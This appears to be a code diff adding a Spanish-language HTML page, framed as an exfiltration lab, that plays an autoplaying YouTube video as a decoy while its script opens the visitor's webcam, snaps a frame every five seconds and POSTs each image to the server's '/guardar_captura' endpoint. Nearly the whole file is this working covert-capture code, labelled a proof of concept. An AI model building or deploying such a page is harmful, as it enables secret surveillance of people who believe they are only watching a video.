@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Laboratorio Avanzado: Exfiltración de Datos Multimedia</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f9; text-align: center; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .video-container { margin: 20px 0; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+        #monitor-area { margin-top: 40px; border-top: 2px dashed #ff4d4d; padding-top: 20px; background-color: #fff1f1; }
+        .cam-preview { width: 320px; height: 240px; border: 2px solid #333; background-color: #000; }
+        .gallery { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-top: 15px; }
+        .gallery img { width: 150px; border: 2px solid #ff4d4d; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Entorno de Simulación: Análisis de Exfiltración en Segundo Plano</h2>
+        <p>El sistema simula la reproducción de contenido mientras interactúa con las APIs del sistema hacia el servidor.</p>
+
+        <div class="video-container">
+            <iframe width="720" height="405" 
+                src="https://www.youtube.com/embed/TU_ID_DE_VIDEO?autoplay=1" 
+                title="YouTube video player" frameborder="0" 
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                allowfullscreen>
+            </iframe>
+        </div>
+
+        <div id="monitor-area">
+            <h3>[Vista del Servidor / Panel de Control Local]</h3>
+            <video id="webcam" class="cam-preview" autoplay playsinline></video>
+            <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+            <h4>Historial de Capturas Exfiltradas (Cada 5 segundos):</h4>
+            <div id="gallery" class="gallery"></div>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('webcam');
+        const canvas = document.getElementById('canvas');
+        const gallery = document.getElementById('gallery');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+            .then(function(stream) {
+                video.srcObject = stream;
+                // Iniciar la captura y envío cada 5 segundos
+                setInterval(capturarYEnviar, 5000);
+            })
+            .catch(function(err) {
+                console.error("Error de acceso: ", err);
+                gallery.innerHTML = "<p style='color:red;'>Permiso denegado. Se requiere acceso para la PoC.</p>";
+            });
+
+        function capturarYEnviar() {
+            if (video.srcObject) {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg');
+
+                // 1. Mostrar localmente en la galería de la página
+                const img = document.createElement('img');
+                img.src = dataURL;
+                gallery.insertBefore(img, gallery.firstChild);
+                if (gallery.children.length > 4) { gallery.removeChild(gallery.lastChild); }
+
+                // 2. EXFILTRACIÓN: Enviar la imagen al servidor vía POST
+                fetch('/guardar_captura', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ imagen: dataURL })
+                })
+                .then(response => response.json())
+                .then(data => console.log("Respuesta del servidor:", data))
+                .catch(error => console.error("Error al exfiltrar:", error));
+            }
+        }
+    </script>
+</body>
+</html>
